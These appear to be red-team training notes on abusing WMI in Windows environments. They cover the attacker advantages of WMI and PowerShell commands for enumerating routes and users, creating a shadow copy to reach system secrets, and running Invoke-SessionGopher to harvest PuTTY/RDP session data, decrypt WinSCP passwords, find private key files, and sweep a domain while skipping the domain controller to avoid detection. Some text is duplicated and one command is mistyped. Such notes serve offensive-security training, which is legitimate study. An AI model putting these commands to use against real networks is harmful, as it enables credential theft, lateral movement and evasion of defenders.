
### why WMI for RedTeam?


-  Enabled on _all_Windows systems by default.
- Countermeasures and defenders generally don't know or care about use of WMI by attackers.

-  Mixes really well with existing traffic on the network.

-  Provides execution and persistence with SYSTEM privileges.

-  Recon and Information Gathering
-  Authenticated Command and Script execution
- Lateral Movement
- Information, instructions and shellcode storage
-  Backdoors and Persistence



### Information gathering using WMI

From a local or remote box, many interesting
pieces of information can be extracted using
WMI -

-  List routes Win32_IP4RouteTable
-  List users Win32_UserAccount
-  List Groups with Win32_Group
-  System secrets using Win32_ShadowCopy
- Loads of useful Information from Registry (using StdRegProv)
-  Also refer to Hands On 1



**RouteTable**

```powershell
Get-CimInstance Win32_IP4RouteTable
```


**UserAccount**

```powershell
get-ciminstance Win32_UserAccount
```

**Other**
```powershell 
PS C:\Users\charon> Get-WmiObject -Class *user* -List

   NameSpace: ROOT\cimv2

Name                                Methods              Properties
----                                -------              ----------
CIM_UserDevice
Win32_UserAccount
Win32_UserProfile
Win32_LoggedOnUser
Win32_SystemUsers
Win32_UserInDomain
Win32_GroupUser
Win32_UserDesktop
__NTLMUser9X
Win32_OfflineFilesUserConfiguration
Win32_RoamingProfileUserConfigurat…
Win32_VolumeUserQuota
Win32_RoamingUserHealthConfigurati…
Win32_UserStateConfigurationContro…
Win32_FolderRedirectionUserConfigu…
Win32_NTLogEventUser
```

```powershell
(Get-WmiObject -Class Win32_Shadowcopy -list).create("C:\", "ClientAccessible")
```

```powershell
$link = (Get-WmiObject -Class Win32_Shadowcopy).DeviceObject + "\"
cmd c mklink /d C: \shadowcony "$link"
```



From a local or remote box, many interesting
pieces of information can be extracted using
WMI -

-  List routes Win32_IP4RouteTable
-  List users Win32_UserAccount

-  List Groups with Win32_Group
-  System secrets using Win32_ShadowCopy
-  Loads of useful Information from Registry (usingStdRegProv)
-  Also refer to Hands On 1

### Invoke-SessionGopher.ps1
-  Useful for identifying admin jump-boxes and/or
computers used to access Unix machines.
-  Extracts session information for Putty and RDP and
can decrypt passwords for WinSCP from Registry.
-  Uses WMI for extracting information from Registry.
Admin not required for local but necessary for
remote operations.
https://github.com/Arvanaghi/SessionGopher-Arvanaghi


- Gather information from the local box

```powershell
Invoke-SessionGopher -Verbose
```

-  Gather information from a remote box

```powershell
Invoke-SessionGopher -ComputerName 192.168.11.2 -Credential opsdclabuser
```

-  Gather information from all machines in the domain

```powershell
Invoke-SessionGopher -Credential opsdclabuser -AllDomain
```

- Gather information from all machines in the domain but
exclude the DC from the list to avoid detection

```powershell
Invoke-SessionGopher -Credential opsdc\labuser - AllDomain -ExcludeDC
```

![[Pasted image 20260307124412.png]]


- If Thorough mode is used, the filesystem of the target
machine is searched for Putty private key files (.ppk), RDP
files(.rdp) and RSA (.stdid)

```powershell
Invoke-SessionGopher -Thorough
```

